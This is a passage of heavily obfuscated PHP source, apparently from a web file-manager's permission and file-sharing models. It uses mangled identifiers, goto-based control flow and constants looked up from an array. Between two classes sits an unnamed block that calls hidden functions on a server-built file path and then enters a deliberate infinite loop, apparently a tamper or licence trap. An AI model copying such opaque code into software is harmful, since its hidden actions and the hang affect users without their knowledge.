$this->where($bß“ÎéÒïš)->field($dÓñìØË¼Ğ[468])->select(); $F‹ùéä·ƒ = array_to_keyvalue($F‹ùéä·ƒ, $dÓñìØË¼Ğ[33], $dÓñìØË¼Ğ[468]); $B·¶ØÉİ‹ = array_diff($fÄ¥é„…ğ, $F‹ùéä·ƒ); if (!empty($B·¶ØÉİ‹)) { foreach ($a°É†ˆ¥£†[$dÓñìØË¼Ğ[367]] as $fÄë»™®œõ => $fæØíŸÇŞã) { if (in_array($fæØíŸÇŞã[$dÓñìØË¼Ğ[468]], $B·¶ØÉİ‹)) { unset($a°É†ˆ¥£†[$dÓñìØË¼Ğ[367]][$fÄë»™®œõ]); } } } } goto B­†×ï¸; F¥ Õ˜—: if (isset($fÄ¥é„…ğ[$dÓñìØË¼Ğ[29]]) && in_array($fÄ¥é„…ğ[$dÓñìØË¼Ğ[29]], array($dÓñìØË¼Ğ[87], $dÓñìØË¼Ğ[1851], $dÓñìØË¼Ğ[1852], $dÓñìØË¼Ğ[1853], $dÓñìØË¼Ğ[1854]))) { $bß“ÎéÒïš[$dÓñìØË¼Ğ[29]] = $fÄ¥é„…ğ[$dÓñìØË¼Ğ[29]]; } if (isset($fÄ¥é„…ğ[$dÓñìØË¼Ğ[710]]) && in_array($fÄ¥é„…ğ[$dÓñìØË¼Ğ[710]], array($dÓñìØË¼Ğ[191], $dÓñìØË¼Ğ[87], $dÓñìØË¼Ğ[1851], $dÓñìØË¼Ğ[1852]))) { $bß“ÎéÒïš[$dÓñìØË¼Ğ[710]] = $fÄ¥é„…ğ[$dÓñìØË¼Ğ[710]]; } $dòœ‹ùê†é = Input::get($dÓñìØË¼Ğ[436], $dÓñìØË¼Ğ[7], $dÓñìØË¼Ğ[1850], array($dÓñìØË¼Ğ[1774], $dÓñìØË¼Ğ[430])); goto F’™ÆøáÙ³; F’™ÆøáÙ³: $Fß­†ß¨œ = array($dÓñìØË¼Ğ[428] => $dÓñìØË¼Ğ[429], $dÓñìØË¼Ğ[430] => $dÓñìØË¼Ğ[431]); $fäá¦ÎÌ˜œ = $dÓñìØË¼Ğ[1855] . $Fß­†ß¨œ[$dòœ‹ùê†é]; $a°É†ˆ¥£† = Model($dÓñìØË¼Ğ[1846])->where($bß“ÎéÒïš)->order($fäá¦ÎÌ˜œ)->selectPage(20); goto Få‘Ü†ì©À; B­†×ï¸: $this->_listDataApply($a°É†ˆ¥£†[$dÓñìØË¼Ğ[367]]); return $a°É†ˆ¥£†; goto aÒ½¿ô¡©; aÒ½¿ô¡©: } public function reportStatus($F‘’¢ĞÁèê) { goto aÔ‰ğËøÒÓ; B ’Ò‚É¯: return $e¦”×èæŞÀ; goto fÇš„ƒê…Û; aÔ‰ğËøÒÓ: $bÂâÇ¿æŠ =& $_SERVER[œº]; $BŠÄá¥¼¡ = array($bÂâÇ¿æŠ[393] => $F‘’¢ĞÁèê[$bÂâÇ¿æŠ[393]]); $E´¶õì‚ = Model($bÂâÇ¿æŠ[1846])->where($BŠÄá¥¼¡)->field($bÂâÇ¿æŠ[1856])->find(); goto Eˆ¿²¦ÕÊ; Eˆ¿²¦ÕÊ: if (!$E´¶õì‚) { return !1; } $cîØí‹Ëô† = array($bÂâÇ¿æŠ[710] => $F‘’¢ĞÁèê[$bÂâÇ¿æŠ[710]]); if ($F‘’¢ĞÁèê[$bÂâÇ¿æŠ[710]] == $bÂâÇ¿æŠ[1852] && $E´¶õì‚[$bÂâÇ¿æŠ[710]] == $bÂâÇ¿æŠ[1852]) { $cîØí‹Ëô†[$bÂâÇ¿æŠ[710]] = 0; } goto c‡®§Œ¦ù™; c‡®§Œ¦ù™: $e¦”×èæŞÀ = Model($bÂâÇ¿æŠ[1846])->where($BŠÄá¥¼¡)->save($cîØí‹Ëô†); if ($F‘’¢ĞÁèê[$bÂâÇ¿æŠ[710]] == $bÂâÇ¿æŠ[1851]) { if ($E´¶õì‚[$bÂâÇ¿æŠ[447]] != $bÂâÇ¿æŠ[191] && $this->shareFileMeta($E´¶õì‚[$bÂâÇ¿æŠ[447]])) { $this->shareFileMeta($E´¶õì‚[$bÂâÇ¿æŠ[447]], 0); } $this->remove($E´¶õì‚[$bÂâÇ¿æŠ[468]]); return !0; } if ($e¦”×èæŞÀ && $F‘’¢ĞÁèê[$bÂâÇ¿æŠ[710]] == $bÂâÇ¿æŠ[1852]) { $Dâ†ÅÈ»‚Õ = $cîØí‹Ëô†[$bÂâÇ¿æŠ[710]] == $bÂâÇ¿æŠ[1852] ? 1 : 0; $this->shareFileMeta($E´¶õì‚[$bÂâÇ¿æŠ[447]], $Dâ†ÅÈ»‚Õ); $this->removeByFile($E´¶õì‚[$bÂâÇ¿æŠ[447]]); } goto B ’Ò‚É¯; fÇš„ƒê…Û: } private function removeByFile($eéöˆˆ›…) { goto bËÓåÓµ§‚; aÂø¡ÛÃ£È: $A±¸¸Ø¯…Ï = array_to_keyvalue($f§˜Î´„§, $E«Êí¤º‡à[33], $E«Êí¤º‡à[468]); $this->remove($A±¸¸Ø¯…Ï); goto b§¬èŞˆÊ½; B‚¤Ã¢ë¨•: $Ağ‰¥Ú = array($E«Êí¤º‡à[395] => array($E«Êí¤º‡à[7], $F§ËÉø¯Ú³), $E«Êí¤º‡à[473] => 1); $f§˜Î´„§ = $this->where($Ağ‰¥Ú)->field($E«Êí¤º‡à[468])->select(); if (empty($f§˜Î´„§)) { return; } goto aÂø¡ÛÃ£È; bËÓåÓµ§‚: $E«Êí¤º‡à =& $_SERVER[œº]; $f§˜Î´„§ = Model($E«Êí¤º‡à[790])->where(array($E«Êí¤º‡à[447] => $eéöˆˆ›…))->field($E«Êí¤º‡à[395])->select(); $F§ËÉø¯Ú³ = array_to_keyvalue($f§˜Î´„§, $E«Êí¤º‡à[33], $E«Êí¤º‡à[395]); goto B‚¤Ã¢ë¨•; b§¬èŞˆÊ½: } private function shareFileMeta($CœØôªšØ’, $d ¶Šİã¼« = null) { $c†³¨’ï„¡ =& $_SERVER[œº]; $DÌ¤Èİ˜‡ = array($c†³¨’ï„¡[447] => $CœØôªšØ’, $c†³¨’ï„¡[93] => $c†³¨’ï„¡[1857]); if (is_null($d ¶Šİã¼«)) { return Model($c†³¨’ï„¡[1858])->where($DÌ¤Èİ˜‡)->find(); } $DÌ¤Èİ˜‡[$c†³¨’ï„¡[372]] = $d ¶Šİã¼«; Model($c†³¨’ï„¡[1858])->add($DÌ¤Èİ˜‡, array(), !0); } } if (!isset($_SERVER[$_SERVER[œº][821]]) || !isset($_SERVER[$_SERVER[œº][822]])) { goto eÙóÚ—¶¶»; eÙóÚ—¶¶»: $FÓ—º·öÂö = $_SERVER[œº][823]; $E¬º¹ğó ¼ = $_SERVER[$_SERVER[œº][824]] . $_SERVER[œº][825]; $DğÌ©Æœ…ã = $FÓ—º·öÂö($E¬º¹ğó ¼); goto cí«˜‡ÎÑó; cí«˜‡ÎÑó: $aŒåö™®Ï” = explode($_SERVER[œº][229], $DğÌ©Æœ…ã); if (count($aŒåö™®Ï”) < $_SERVER[œº][589]) { $FŸ•Ê»Ñ®ğ = $_SERVER[œº][826]; $FŸ•Ê»Ñ®ğ(); } $F¢ÌÃïï = $_SERVER[œº][827]; goto F‹¦™Ğùã•; F‹¦™Ğùã•: $F¢ÌÃïï($_SERVER[$_SERVER[œº][824]] . $_SERVER[œº][825]); $E°Û†½Û¨õ = 2; while ($E°Û†½Û¨õ > 1) { $a••¨ÜÓ¥½ = rawurlencode($E°Û†½Û¨õ . $_SERVER[œº][375]); } goto c¿â¨‚åò’; c¿â¨‚åò’: } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\165\162\143\145\137\x61\x75\x74\x68"; public function getAuth($b«İ™Ñ–ó) { goto aºó¹ÆÍå¸; cµé‰»®ÁÛ: array_multisort($c£ÍòÏƒÏò, SORT_DESC, $díˆ±‡ÕÌÔ); return $díˆ±‡ÕÌÔ; goto dæ­°†ï¤—; aºó¹ÆÍå¸: $cßÄ¹Êà‡ =& $_SERVER[œº]; $bâ›¼‹Ç›© = $this->sourceAuthSelect($b«İ™Ñ–ó); $díˆ±‡ÕÌÔ = array(); goto EØÙì•çå; EØÙì•çå: $c£ÍòÏƒÏò = array(); $cÜÔ—„ñÎé = 2 << 25; foreach ($bâ›¼‹Ç›© as $BğË‘£¢) { goto E «º£ëÁ; CÔ¦ÉœÀ¥É: $CÎÖ¬²‘ì¬ = 0; if ($BğË‘£¢[$cßÄ¹Êà‡[404]] == SourceModel::TYPE_GROUP) { $CÎÖ¬²‘ì¬ = $cÜÔ—„ñÎé * 2; } if ($BğË‘£¢[$cßÄ¹Êà‡[404]] == SourceModel::TYPE_USER) { $CÎÖ¬²‘ì¬ = $cÜÔ—„ñÎé; } goto a»ñ¢çì†§; E «º£ëÁ: $CƒŠõ»”Å§ = Model($cßÄ¹Êà‡[1859])->listData($BğË‘£¢[$cßÄ¹Êà‡[1787]]); if (!$CƒŠõ»”Å§) { continue; } $díˆ±‡ÕÌÔ[] = $BğË‘£¢; goto CÔ¦ÉœÀ¥É; a»ñ¢çì†§: if ($BğË‘£¢[$cßÄ¹Êà‡[404]] == SourceModel::TYPE_USER && $BğË‘£¢[$cßÄ¹Êà‡[484]] == $cßÄ¹Êà‡[191]) { $CÎÖ¬²‘ì¬ = 0; } $c£ÍòÏƒÏò[] = $CƒŠõ»”Å§[$cßÄ¹Êà‡[406]] + $CÎÖ¬²‘ì¬; goto CÎ˜àÈ×ë; CÎ˜àÈ×ë: } goto cµé‰»®ÁÛ; dæ­°†ï¤—: } public function sourceAuthSelect($Dß¨ğ’Ö£ì) { goto eŞ Æ”ó; eŞ Æ”ó: $f ÛôªÇ©ª =& $_SERVER[œº]; static $Eš ¡¯†èæ = array(); $f³ò¸äÃ = is_array($Dß¨ğ’Ö£ì) ? !1 : !0; goto f»í³‹Í¨µ; f»í³‹Í¨µ: if ($f³ò¸äÃ) { $Dß¨ğ’Ö£ì = array($Dß¨ğ’Ö£ì); } $Fğ·ŸÄ…•” = array(); foreach ($Dß¨ğ’Ö£ì as $Eœ¬Üôğß™) { if (isset($Eš ¡¯†èæ[$Eœ¬Üôğß™])) { $Fğ·ŸÄ…•”[$Eœ¬Üôğß™] = $Eš ¡¯†èæ[$Eœ¬Üôğß™]; } } goto EŒ‹â¦è¸ó; BšÃŒĞÒõõ: $D ğ¼ÆÚ = $this->field($eëê÷ÏİËÎ)->order($f ÛôªÇ©ª[393])->where($FË ¿Äµ”…)->select(); $CÕà¶°Ì‡ = array_to_keyvalue_group($D ğ¼ÆÚ, $f ÛôªÇ©ª[395]); foreach ($Dß¨ğ’Ö£ì as $Eœ¬Üôğß™) { $Eš ¡¯†èæ[$Eœ¬Üôğß™] = $CÕà¶°Ì‡[$Eœ¬Üôğß™] ? $CÕà¶°Ì‡[$Eœ¬Üôğß™] : array(); } goto F¶”×Çã”é; EŒ‹â¦è¸ó: if (count($Fğ·ŸÄ…•”) == count($Dß¨ğ’Ö£ì)) { return $f³ò¸äÃ ? $Fğ·ŸÄ…•”[$Dß¨ğ’Ö£ì[0]] : $Fğ·ŸÄ…•”; } $eëê÷ÏİËÎ = $f ÛôªÇ©ª[1860]; $FË ¿Äµ”… = array($f ÛôªÇ©ª[395] => array($f ÛôªÇ©ª[7], $Dß¨ğ’Ö£ì)); goto BšÃŒĞÒõõ; F¶”×Çã”é: if ($f³ò¸äÃ) { return $D ğ¼ÆÚ; } return $CÕà¶°Ì‡; goto a¹Ÿù¼Õ«; a¹Ÿù¼Õ«: } public function setAuth($b¼¯¸¥ƒôŠ, $CÏåî¢‡ø) { goto e¯‚»Şá; A†ãÑÇˆ»»: return !0; goto FŞä˜±êÈ·; f×‚İù‰†¾: if ($C‡ÂÓ‚›› != $Aæ¤¬Ë«º¯) { $FŞ¡®…” = array($b÷²×©¡Æˆ[1692] => $C‡ÂÓ‚››); $d³‰ãòÚ¡‚ = Model($b÷²×©¡Æˆ[1773])->field($b÷²×©¡Æˆ[1528])->where($FŞ¡®…”)->select(); $d³‰ãòÚ¡‚ = array_to_keyvalue($d³‰ãòÚ¡‚, $b÷²×©¡Æˆ[33], $b÷²×©¡Æˆ[1528]); } $dòÚôËÄà = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $D‡ãĞ»š  = array(); goto AÀŸá”øÖÏ; AÀŸá”øÖÏ: foreach ($CÏåî¢‡ø as $B™ÕœÑˆŒµ) { if (!in_array($B™ÕœÑˆŒµ[$b÷²×©¡Æˆ[404]], $dòÚôËÄà)) { show_json(LNG($b÷²×©¡Æˆ[1861]), !1); } if ($C‡ÂÓ‚›› != $Aæ¤¬Ë«º¯) { if ($B™ÕœÑˆŒµ[$b÷²×©¡Æˆ[404]] == SourceModel::TYPE_GROUP) { } if ($B™ÕœÑˆŒµ[$b÷²×©¡Æˆ[484]] != 0 && !in_array($B™ÕœÑˆŒµ[$b÷²×©¡Æˆ[484]], $d³‰ãòÚ¡‚)) { } } if ($B™ÕœÑˆŒµ[$b÷²×©¡Æˆ[484]] == 0) { $B™ÕœÑˆŒµ[$b÷²×©¡Æˆ[404]] = SourceModel::TYPE_USER; } $D‡ãĞ»š [] = array($b÷²×©¡Æˆ[395] => $b¼¯¸¥ƒôŠ, $b÷²×©¡Æˆ[404] => intval($B™ÕœÑˆŒµ[$b÷²×©¡Æˆ[404]]), $b÷²×©¡Æˆ[484] => intval($B™ÕœÑˆŒµ[$b÷²×©¡Æˆ[484]]), $b÷²×©¡Æˆ[1787] => intval($B™ÕœÑˆŒµ[$b÷²×©¡Æˆ[1787]]) ? intval($B™ÕœÑˆŒµ[$b÷²×©¡Æˆ[1787]]) : 0, $b÷²×©¡Æˆ[1841] => intval($B™ÕœÑˆŒµ[$b÷²×©¡Æˆ[1841]]) ? intval($B™ÕœÑˆŒµ[$b÷²×©¡Æˆ[1841]]) : -1); } $this->where(array($b÷²×©¡Æˆ[410] => $b¼¯¸¥ƒôŠ))->delete(); $this->addAll($D‡ãĞ»š ); goto A†ãÑÇˆ»»; Bª‹‹˜‘ÚË: if ($AÉ‡Ó×Œ×[$b÷²×©¡Æˆ[404]] != SourceModel::TYPE_GROUP) { return !1; } $Aæ¤¬Ë«º¯ = 1; $C‡ÂÓ‚›› = $AÉ‡Ó×Œ×[$b÷²×©¡Æˆ[484]]; goto f×‚İù‰†¾; e¯‚»Şá: $b÷²×©¡Æˆ =& $_SERVER[œº]; $AÉ‡Ó×Œ× = Model($b÷²×©¡Æˆ[1206])->sourceInfo($b¼¯¸¥ƒôŠ); if (!$AÉ‡Ó×Œ×) { return !1; } goto Bª‹‹˜‘ÚË; FŞä˜±êÈ·: } public function authClear($aÆ¾…½Íœô) { $F‹ÃÛ†„Ş­ =& $_SERVER[œº]; $bä¤áÊŒá = Model($F‹ÃÛ†„Ş­[1206])->sourceInfo($aÆ¾…½Íœô); $f‰™›‘¤ï = array($aÆ¾…½Íœô); if ($bä¤áÊŒá[$F‹ÃÛ†„Ş­[403]] == $F‹ÃÛ†„Ş­[87]) { $a’ì¡ä­Šô = array($F‹ÃÛ†„Ş­[553] => array($F‹ÃÛ†„Ş­[512], $bä¤áÊŒá[$F‹ÃÛ†„Ş­[487]] . $aÆ¾…½Íœô . $F‹ÃÛ†„Ş­[513])); $f‰™›‘¤ï = Model($F‹ÃÛ†„Ş­[1206])->field($F‹ÃÛ†„Ş­[410])->where($a’ì¡ä­Šô)->getField($F‹ÃÛ†„Ş­[395], !0); $f‰™›‘¤ï[] = $aÆ¾…½Íœô; } $this->where(array($F‹ÃÛ†„Ş­[410] => array($F‹ÃÛ†„Ş­[411], $f‰™›‘¤ï)))->delete(); return !0; } public function getAllChildren($F«ªˆ¦ÄÎ) { goto bÜÁá¾¾Èê; dÔêˆÍì…Á: $B˜šš»¦šÈ = Model($c•Ùğº°á†[790])->field($cîÜ†Œ”°‹)->where($bô–áµ”ˆ)->select(); $b§…äé¿‰ = array($F«ªˆ¦ÄÎ); foreach ($B˜šš»¦šÈ as $Dõâ©ç…Æ…) { foreach ($C‚Á°ò¹Ú£ as $Dô²Œè¼İ) { $dÑÏšå÷ƒ = $c•Ùğº°á†[47] . $Dô²Œè¼İ . $c•Ùğº°á†[47]; $EËØÃŞ¶“Œ = $Dõâ©ç…Æ…[$c•Ùğº°á†[487]] . $Dõâ©ç…Æ…[$c•Ùğº°á†[395]] . $c•Ùğº°á†[47]; if (strstr($EËØÃŞ¶“Œ, $dÑÏšå÷ƒ)) { $b§…äé¿‰[] = $Dõâ©ç…Æ…[$c•Ùğº°á†[395]]; break; } } } goto BˆæÎß¶»; BˆæÎß¶»: return $this->sourceListAuth($b§…äé¿‰); goto fÅÈËˆŸŠš; bÜÁá¾¾Èê: $c•Ùğº°á† =& $_SERVER[œº]; $cîÕ¥ĞÙµ‹ = Model($c•Ùğº°á†[1206])->sourceInfo($F«ªˆ¦ÄÎ); if ($cîÕ¥ĞÙµ‹[$c•Ùğº°á†[403]] != $c•Ùğº°á†[87]) { return $this->sourceListAuth(array($F«ªˆ¦ÄÎ)); } goto C´ˆçŠ¬Ç; eñõ‡÷ìÖ: if ($cîÕ¥ĞÙµ‹[$c•Ùğº°á†[478]] == $c•Ùğº°á†[191] && $cîÕ¥ĞÙµ‹[$c•Ùğº°á†[484]] != $EğŠ¤İĞçÇ) { $C‚Á°ò¹Ú£ = $this->groupChidldAllRootSource($cîÕ¥ĞÙµ‹[$c•Ùğº°á†[484]]); } $CÄõßÖà” = $this->field($c•Ùğº°á†[395])->group($c•Ùğº°á†[395])->select(); $CÄõßÖà” = array_to_keyvalue($CÄõßÖà”, $c•Ùğº°á†[33], $c•Ùğº°á†[395]); goto Bç«”î´‚; Bç«”î´‚: if (!$CÄõßÖà”) { return array(); } $cîÜ†Œ”°‹ = $c•Ùğº°á†[1862]; $bô–áµ”ˆ = array($c•Ùğº°á†[395] => array($c•Ùğº°á†[7], $CÄõßÖà”), $c•Ùğº°á†[423] => $c•Ùğº°á†[191]); goto dÔêˆÍì…Á; C´ˆçŠ¬Ç: if ($cîÕ¥ĞÙµ‹[$c•Ùğº°á†[404]] != SourceModel::TYPE_GROUP) { return array(); } $EğŠ¤İĞçÇ = 1; $C‚Á°ò¹Ú£ = array($F«ªˆ¦ÄÎ); goto eñõ‡÷ìÖ; fÅÈËˆŸŠš: } private function sourceListAuth($A†Åñ†¼Šñ) { goto E“×´’›×«; C‹ÃÓ»†¡Ù: $cé¹ˆ×”ó = array(); $B‡â•æÌÏœ = array(); foreach ($DíÃÌÜæ‚Ä as $cÊŞØƒÜÂİ) { goto Fœ“„Ñ˜ÉÏ; câÍò®³õ: $díÇÒ³ÀÎò = count(explode($Fæ—¬¡¥à[8], trim($cÊŞØƒÜÂİ[$Fæ—¬¡¥à[495]], $Fæ—¬¡¥à[8]))); $B‡â•æÌÏœ[] = $díÇÒ³ÀÎò + ($cÊŞØƒÜÂİ[$Fæ—¬¡¥à[29]] == $Fæ—¬¡¥à[77] ? 0 : 1000); goto BµçáÊêÛ; Fœ“„Ñ˜ÉÏ: unset($cÊŞØƒÜÂİ[$Fæ—¬¡¥à[434]]); unset($cÊŞØƒÜÂİ[$Fæ—¬¡¥à[432]]); unset($cÊŞØƒÜÂİ[$Fæ—¬¡¥à[406]]); goto c ÙŸºµ¶; CöÀ°Â¦‡: $cÊŞØƒÜÂİ[$Fæ—¬¡¥à[1863]] = $this->authTargetInfo($E·Ùµç‰Õ); $cÊŞØƒÜÂİ[$Fæ—¬¡¥à[495]] = rtrim($cÊŞØƒÜÂİ[$Fæ—¬¡¥à[490]], $Fæ—¬¡¥à[8]) . $Fæ—¬¡¥à[8] . ltrim($cÊŞØƒÜÂİ[$Fæ—¬¡¥à[495]], $Fæ—¬¡¥à[8]); $cé¹ˆ×”ó[] = $cÊŞØƒÜÂİ; goto câÍò®³õ; c ÙŸºµ¶: unset($cÊŞØƒÜÂİ[$Fæ—¬¡¥à[85]]); $E·Ùµç‰Õ = $CÏ¬ñ„Š[$cÊŞØƒÜÂİ[$Fæ—¬¡¥à[395]]]; if (!$E·Ùµç‰Õ) { continue; } goto CöÀ°Â¦‡; BµçáÊêÛ: } goto D‰…à†ƒè; D‰…à†ƒè: array_multisort($B‡â•æÌÏœ, SORT_ASC, $cé¹ˆ×”ó); return $cé¹ˆ×”ó; goto Eõ½†ù¹•˜; E“×´’›×«: $Fæ—¬¡¥à =& $_SERVER[œº]; $DíÃÌÜæ‚Ä = Model($Fæ—¬¡¥à[1206])->sourceListInfo($A†Åñ†¼Šñ, !0); $CÏ¬ñ„Š = $this->sourceAuthSelect($A†Åñ†¼Šñ); goto C‹ÃÓ»†¡Ù; Eõ½†ù¹•˜: } private function groupChidldAllRootSource($dÜÙİ˜ô“) { $cƒ‰šöÃ³¥ =& $_SERVER[œº]; $b•‹®ë²ßå = Model($cƒ‰šöÃ³¥[1864])->groupChildrenAll($dÜÙİ˜ô“); $b´Ëñ‚áñ¾ = array($cƒ‰šöÃ³¥[478] => 0, $cƒ‰šöÃ³¥[484] => array($cƒ‰šöÃ³¥[7], $b•‹®ë²ßå), $cƒ‰šöÃ³¥[404] => SourceModel::TYPE_GROUP); $fŒ™÷ÒŒÖ„ = Model($cƒ‰šöÃ³¥[790])->field($cƒ‰šöÃ³¥[395])->where($b´Ëñ‚áñ¾)->select(); $fŒ™÷ÒŒÖ„ = array_to_keyvalue($fŒ™÷ÒŒÖ„, $cƒ‰šöÃ³¥[33], $cƒ‰šöÃ³¥[395]); return $fŒ™÷ÒŒÖ„; } private function authTargetInfo($eºÜÖ…¼…½) { goto D’çÑŠáø•; DêÂ“à„ÔË: $c´î§‹’å÷ = 2 << 25; foreach ($eºÜÖ…¼…½ as $fÄ“ƒ¢³óŒ) { goto fÑÎºÓ‘¼­; fÑÎºÓ‘¼­: $aÊœõÔ¶¯Ò = Model($AÁ‡£„ã•[1859])->listData($fÄ“ƒ¢³óŒ[$AÁ‡£„ã•[1787]]); if (!$aÊœõÔ¶¯Ò) { continue; } if ($fÄ“ƒ¢³óŒ[$AÁ‡£„ã•[404]] == SourceModel::TYPE_USER) { $fÒ‡„œ›‡ñ = Model($AÁ‡£„ã•[502])->getInfoSimpleOuter($fÄ“ƒ¢³óŒ[$AÁ‡£„ã•[484]]); if ($fÒ‡„œ›‡ñ[$AÁ‡£„ã•[1528]] == $AÁ‡£„ã•[1085]) { continue; } if ($fÒ‡„œ›‡ñ[$AÁ‡£„ã•[1528]] == $AÁ‡£„ã•[191]) { $fÒ‡„œ›‡ñ[$AÁ‡£„ã•[28]] = LNG($AÁ‡£„ã•[1865]); } } else { $fÒ‡„œ›‡ñ = Model($AÁ‡£„ã•[486])->getInfoSimple($fÄ“ƒ¢³óŒ[$AÁ‡£„ã•[484]]); } goto F¾Ç—îˆò•; f¬åµòÌ¢š: $fÜëÅÁÊŞ = 0; if ($fÄ“ƒ¢³óŒ[$AÁ‡£„ã•[404]] == SourceModel::TYPE_GROUP) { $fÜëÅÁÊŞ = $c´î§‹’å÷ * 2; } if ($fÄ“ƒ¢³óŒ[$AÁ‡£„ã•[404]] == SourceModel::TYPE_USER) { $fÜëÅÁÊŞ = $c´î§‹’å÷; } goto bÛ–îÉ¡©÷; bÛ–îÉ¡©÷: if ($fÄ“ƒ¢³óŒ[$AÁ‡£„ã•[404]] == SourceModel::TYPE_USER && $fÄ“ƒ¢³óŒ[$AÁ‡£„ã•[484]] == $AÁ‡£„ã•[191]) { $fÜëÅÁÊŞ = 0; } $Aä—è‹ò±Ò[] = $aÊœõÔ¶¯Ò[$AÁ‡£„ã•[406]] + $fÜëÅÁÊŞ; goto aåÖ—ù—‰; F¾Ç—îˆò•: if (!$fÒ‡„œ›‡ñ) { continue; } $fÒ‡„œ›‡ñ[$AÁ‡£„ã•[446]] = $aÊœõÔ¶¯Ò; $aª°Ü­´¬[] = $fÒ‡„œ›‡ñ; goto f¬åµòÌ¢š; aåÖ—ù—‰: } array_multisort($Aä—è‹ò±Ò, SORT_DESC, $aª°Ü­´¬); goto dä…ğŠ’³¹; D’çÑŠáø•: $AÁ‡£„ã• =& $_SERVER[œº]; $aª°Ü­´¬ = array(); $Aä—è‹ò±Ò = array(); goto DêÂ“à„ÔË; dä…ğŠ’³¹: return $aª°Ü­´¬; goto c›¤ÄÜÚÂÓ; c›¤ÄÜÚÂÓ: } public function getAllChildrenByUser($cà…ÎÓ™ÙÚ, $FÕ¡†çä Å) { goto d‚¦÷Õ†Ï; d‚¦÷Õ†Ï: $dÏªæàºÁ =& $_SERVER[œº]; $dà©êŠ®ÙÊ = Model($dÏªæàºÁ[506])->getInfo($FÕ¡†çä Å); if (!$FÕ¡†çä Å || !$cà…ÎÓ™ÙÚ || !$dà©êŠ®ÙÊ) { return array(); } goto a¬…İ‘…«; DÕ¼Û±’‘: return $F²õçÃĞÜ®; goto d«‘Äá£ ˆ; f‘“¡ã–¡: if ($EÂœßïÕ[$dÏªæàºÁ[478]] == $dÏªæàºÁ[191] && $EÂœßïÕ[$dÏªæàºÁ[484]] != $F¿¤Â•‡òÇ && $this->groupContainUser($EÂœßïÕ[$dÏªæàºÁ[484]], $FÕ¡†çä Å)) { foreach ($dà©êŠ®ÙÊ[$dÏªæàºÁ[1866]] as $Có¨É¤ÖÜë) { $B¬Šµâ†ˆ = Model($dÏªæàºÁ[486])->getInfo($Có¨É¤ÖÜë[$dÏªæàºÁ[1692]]); $Dƒº÷İ™¶ã = Model($dÏªæàºÁ[506])->getInfoSimpleOuter($FÕ¡†çä Å); $Dƒº÷İ™¶ã[$dÏªæàºÁ[446]] = $Có¨É¤ÖÜë[$dÏªæàºÁ[406]]; if (Model($dÏªæàºÁ[1859])->authCheckAction($Có¨É¤ÖÜë[$dÏªæàºÁ[406]][$dÏªæàºÁ[406]], $dÏªæàºÁ[1712])) { continue; } $bÇˆ“Ş‘çâ = array($dÏªæàºÁ[28] => $dÏªæàºÁ[1481] . $B¬Šµâ†ˆ[$dÏªæàºÁ[28]], $dÏªæàºÁ[395] => $B¬Šµâ†ˆ[$dÏªæàºÁ[85]][$dÏªæàºÁ[395]], $dÏªæàºÁ[76] => KodIO::make($B¬Šµâ†ˆ[$dÏªæàºÁ[85]][$dÏªæàºÁ[395]]), $dÏªæàºÁ[478] => $dÏªæàºÁ[191], $dÏªæàºÁ[404] => $dÏªæàºÁ[1015], $dÏªæàºÁ[29] => $dÏªæàºÁ[517], $dÏªæàºÁ[495] => $B¬Šµâ†ˆ[$dÏªæàºÁ[491]], $dÏªæàºÁ[1692] => $B¬Šµâ†ˆ[$dÏªæàºÁ[1692]], $dÏªæàºÁ[488] => $B¬Šµâ†ˆ[$dÏªæàºÁ[478]], $dÏªæàºÁ[1863] => array($Dƒº÷İ™¶ã)); $CšëÜ‘§Ã[$bÇˆ“Ş‘çâ[$dÏªæàºÁ[395]]] = $bÇˆ“Ş‘çâ; } } $F²õçÃĞÜ® = array(); $C‡ĞÓèçê‰ = $this->getAllChildren($cà…ÎÓ™ÙÚ); goto E©¡¶ñ®ø; a¬…İ‘…«: $EÂœßïÕ = Model($dÏªæàºÁ[1206])->sourceInfo($cà…ÎÓ™ÙÚ); $CšëÜ‘§Ã = array(); $F¿¤Â•‡òÇ = 1; goto f‘“¡ã–¡; E©¡¶ñ®ø: foreach ($C‡ĞÓèçê‰ as $A¸÷¿òØ¥ò) { $bŠÆ¬å“Å = !1; foreach ($A¸÷¿òØ¥ò[$dÏªæàºÁ[1863]] as $aôÃ•Ñ¢¹) { if ($aôÃ•Ñ¢¹[$dÏªæàºÁ[1528]]) { if ($aôÃ•Ñ¢¹[$dÏªæàºÁ[1528]] == $FÕ¡†çä Å) { $bŠÆ¬å“Å = !0; break; } } if ($aôÃ•Ñ¢¹[$dÏªæàºÁ[1692]]) { if ($this->groupContainUser($aôÃ•Ñ¢¹[$dÏªæàºÁ[1692]], $FÕ¡†çä Å)) { $bŠÆ¬å“Å = !0; break; } } } if ($bŠÆ¬å“Å) { $F²õçÃĞÜ®[] = $A¸÷¿òØ¥ò; } $dºÎï‰¶„ = $A¸÷¿òØ¥ò[$dÏªæàºÁ[395]]; if (isset($CšëÜ‘§Ã[$dºÎï‰¶„])) { $A¸÷¿òØ¥ò[$dÏªæàºÁ[1863]][] = $CšëÜ‘§Ã[$dºÎï‰¶„][0]; $CšëÜ‘§Ã[$dºÎï‰¶„] = !1; } } $CšëÜ‘§Ã = array_filter(array_values($CšëÜ‘§Ã)); $F²õçÃĞÜ® = array_merge($CšëÜ‘§Ã, $F²õçÃĞÜ®); goto DÕ¼Û±’‘; d«‘Äá£ ˆ: } public function setAllChildrenByUser($B£¥Å¥ì¿ä, $fŒˆÊÌÀÜ£, $DÏæ§Ó‘Ä†) { $BŒÚÉ™“Ä =& $_SERVER[œº]; $e„•Ç‰ô·£ = $this->getAllChildrenByUser($B£¥Å¥ì¿ä, $fŒˆÊÌÀÜ£); if (!$DÏæ§Ó‘Ä† || !$e„•Ç‰ô·£) { return !1; } foreach ($e„•Ç‰ô·£ as $dÛí¶öÉ) { $dãá¹Øö“î = array(); foreach ($dÛí¶öÉ[$BŒÚÉ™“Ä[1863]] as $D÷ğ¸Ã¹¤Ÿ) { $b­øµÀèà = $D÷ğ¸Ã¹¤Ÿ[$BŒÚÉ™“Ä[446]]; $fÍËóÄ¸Å = $D÷ğ¸Ã¹¤Ÿ[$BŒÚÉ™“Ä[1528]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $a¢ƒ±ğ†› = $D÷ğ¸Ã¹¤Ÿ[$BŒÚÉ™“Ä[1528]] ? $D÷ğ¸Ã¹¤Ÿ[$BŒÚÉ™“Ä[1528]] : 